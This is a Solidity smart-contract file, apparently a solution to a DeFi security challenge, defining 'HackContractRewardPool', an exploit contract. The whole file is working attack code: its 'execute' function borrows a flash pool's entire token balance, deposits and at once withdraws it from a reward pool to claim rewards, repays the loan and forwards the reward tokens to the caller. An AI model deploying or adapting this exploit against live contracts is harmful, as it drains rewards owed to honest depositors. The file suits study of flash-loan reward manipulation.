// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IRewardPool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;
}

interface Ivault {
    function flashLoan(uint256 amount) external;
}

interface ILiquidityToken {
    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract HackContractRewardPool {
    address immutable token;
    address immutable rewardPool;
    address immutable flashLoanPool;
    address immutable rewardToken;

    constructor(
        address _token,
        address _rewardPool,
        address _flashPool,
        address _rewardToken
    ) {
        token = _token;
        rewardPool = _rewardPool;
        flashLoanPool = _flashPool;
        rewardToken = _rewardToken;
    }

    // HACK FUNCTION
    function execute() external {
        uint256 balance = ILiquidityToken(token).balanceOf(flashLoanPool);
        Ivault(flashLoanPool).flashLoan(balance);
        // transfer reward token to msg.sender
        ILiquidityToken(rewardToken).transfer(
            msg.sender,
            ILiquidityToken(rewardToken).balanceOf(address(this))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        uint256 balanceOfthis = ILiquidityToken(token).balanceOf(address(this));

        require(amount == balanceOfthis, "FalshLoan faild");

        // approve token to Reward Pool
        ILiquidityToken(token).approve(rewardPool, amount);
        // Deposit Token to Reward Pool
        IRewardPool(rewardPool).deposit(amount);

        // received reward and withdraw token
        IRewardPool(rewardPool).withdraw(amount);

        // return amount to FlashLoan POOl
        ILiquidityToken(token).transfer(flashLoanPool, amount);
    }
}
